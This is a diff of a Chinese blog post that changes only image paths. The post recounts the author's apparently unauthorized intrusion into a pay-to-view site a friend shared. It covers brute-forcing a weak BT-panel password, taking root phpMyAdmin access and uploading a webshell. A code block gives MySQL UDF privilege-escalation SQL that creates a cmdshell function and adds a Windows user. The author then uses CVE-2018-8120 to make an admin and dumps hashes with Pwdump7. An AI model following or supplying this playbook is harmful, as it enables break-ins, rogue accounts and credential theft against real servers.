@@ -87,21 +87,21 @@
 <meta property="og:site_name" content="Misaki&#39;s Blog">
 <meta property="og:description" content="朋友分享一个站点，点开需要购买点卡，本着节约的原则，简单做了一个测试，于是便有了下文">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image002.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image004.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image006.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image008.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image010.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image012.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image014.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image018.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image020.jpg">
-<meta property="og:image" content="/2018/09/18/对意外发现的某站点测试/clip_image022.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image002.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image004.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image006.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image008.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image010.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image012.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image014.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image018.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image020.jpg">
+<meta property="og:image" content="/2018/09/对意外发现的某站点测试/clip_image022.jpg">
 <meta property="og:updated_time" content="2018-09-18T10:37:58.213Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="对意外发现的某站点测试">
 <meta name="twitter:description" content="朋友分享一个站点，点开需要购买点卡，本着节约的原则，简单做了一个测试，于是便有了下文">
-<meta name="twitter:image" content="/2018/09/18/对意外发现的某站点测试/clip_image002.jpg">
+<meta name="twitter:image" content="/2018/09/对意外发现的某站点测试/clip_image002.jpg">
 
 
 
@@ -332,30 +332,30 @@
 
       
         <p>朋友分享一个站点，点开需要购买点卡，本着节约的原则，简单做了一个测试，于是便有了下文<br><a id="more"></a><br>爆破宝塔系统，页面提示三次错误将出现验证码，那么如何记录错误次数，猜测是通过cookie，删除cookie</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image002.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image002.jpg" alt="img"></p>
 <p>弱口令爆破成功，进入宝塔后台</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image004.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image004.jpg" alt="img"></p>
 <p>从宝塔后台获取phpmyadmin，root权限</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image006.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image006.jpg" alt="img"></p>
 <p>同样可以看到文件系统，但只能看到网站目录，宝塔系统提示，从宝塔建站，默认user权限</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image008.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image008.jpg" alt="img"></p>
 <p>上传shell，同样是只能看到当前网站目录</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image010.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image010.jpg" alt="img"></p>
 <p>考虑通过phpmyadmin提权，发现系统禁止root外连，虽然没有必要，但还是尝试开启外连，用navicat连接数据库接管，用户中找到root用户，编辑权限，开启任意主机链接</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image012.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image012.jpg" alt="img"></p>
 <p>采用udf提权，提权的话需要写入导出权限，但是由于权限设置不能导入导出</p>
 <p>因为mysql对通过文件导入导出作了限制，默认不允许。默认value值为null，则为禁止，如果有文件夹目录，则只允许改目录下文件</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image014.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image014.jpg" alt="img"></p>
 <p>通常操作为以下步骤，但是没有写权限，有了上传权限更方便操作，直接跳过udf导出步骤：</p>
 <p>Udf需要导出到\lib\plugin目录，一般该目录不存在\lib\plugin目录。</p>
 <p>可以尝试利用NTFS ADS创建 plugin目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查询 select &apos;xxx&apos; into dumpfile &apos;C:\\MySQL\\lib::$INDEX_ALLOCATION&apos;;</span><br><span class="line"></span><br><span class="line">导出UDF.DLL</span><br><span class="line"></span><br><span class="line">随便选一个库</span><br><span class="line"></span><br><span class="line">查询 CREATE TABLE Temp_udf(udf BLOB);</span><br><span class="line"></span><br><span class="line">查询 INSERT into Temp_udf values (CONVERT($shellcode,CHAR)); </span><br><span class="line"></span><br><span class="line">查询 SELECT udf FROM Temp_udf INTO DUMPFILE &apos;C:\\MySQL\\lib\\plugin\\udf.dll&apos;;--</span><br><span class="line"></span><br><span class="line">查询 Create function cmdshell returns string soname &apos;udf.dll&apos;; </span><br><span class="line"></span><br><span class="line">查询 select * from mysql.func;</span><br><span class="line"></span><br><span class="line">查询 select cmdshell(&apos;net user test test /add&apos;);</span><br></pre></td></tr></table></figure></p>
 <p>​         </p>
 <p>手动创建plugin目录，上传udf.dll文件，执行以上sql代码，创建账号，拿下服务器</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image018.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image018.jpg" alt="img"></p>
 <p>利用Cve-2018-8120创建账号完成添加管理员</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image020.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image020.jpg" alt="img"></p>
 <p>导出hash，利用Pwdump7</p>
-<p><img src="/2018/09/18/对意外发现的某站点测试/clip_image022.jpg" alt="img"></p>
+<p><img src="/2018/09/对意外发现的某站点测试/clip_image022.jpg" alt="img"></p>
 <p> 这个过程遇到一个问题就是，菜刀下模拟终端无法使用，目录只能看到网站目录，导致一段时间内以为是权限问题，而磁盘下的目录又只是一个网站目录，加深这种认识，拿下服务器的时候才发现是想多了，只有那一个目录。。。</p>
 
       
